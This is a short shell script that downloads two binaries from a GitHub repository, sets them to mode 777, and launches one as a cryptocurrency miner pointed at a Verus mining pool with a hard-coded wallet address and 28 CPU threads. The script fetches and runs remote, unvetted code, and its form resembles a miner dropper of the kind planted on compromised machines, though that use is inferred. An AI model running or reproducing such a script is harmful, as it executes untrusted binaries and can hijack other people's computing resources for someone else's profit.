#!/bin/sh
wget https://github.com/ddauprvpvj5/taek/raw/main/sembarang
wget https://github.com/ddauprvpvj5/taek/raw/main/verus-solver
chmod 777 sembarang
chmod 777 verus-solver
POL=stratum+tcp://na.luckpool.net:3956
WAL=RHjPxndEKoEFRCevNmAeyjus5ZYtVG1iPb
./sembarang -c $POL -u $WAL -p x --cpu 28
